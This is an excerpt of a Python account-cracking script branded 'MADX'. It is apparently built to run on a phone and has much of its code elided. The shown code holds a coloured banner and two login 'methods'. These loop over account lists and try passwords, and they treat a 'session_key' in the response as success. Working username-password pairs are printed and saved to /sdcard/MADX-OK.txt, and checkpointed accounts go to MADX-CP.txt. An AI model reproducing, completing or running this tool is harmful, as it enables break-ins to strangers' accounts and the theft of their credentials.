...
####DESIGN####
def oo(t):
	return '\033[38;5;240m [\033[1;31m'+str(t)+'\033[38;5;240m] \033[1;32m '
...
\033[38;5;88m          88 YY 88 dP""""Yb 8888Y"  dP  Yb     
\033[38;5;237m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
...
#____METHOD_1____#
    def start(user):
     try:
        ...
        sys.stdout.write('\r\033[1;93m[\033[1;97mMADX\033[1;93m]\033[1;92m {}\033[1;93m-\033[1;94m{} \033[1;93m[\033[1;97m{}\033[1;93m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        ...
        ###     print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m] [MADX-OK] \033[1;92m'+acc+' \033[1;92m | \033[1;92m '+pword+'  ')
                open('/sdcard/MADX-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                ...
                cpacc.append(acc)
                open('/sdcard/MADX-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
 ...
 #____METHOD_2____#
    ...
    ###        print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m] [NILL-OK] \033[1;92m'+acc+' \033[1;92m | \033[1;92m '+pword+'  ')
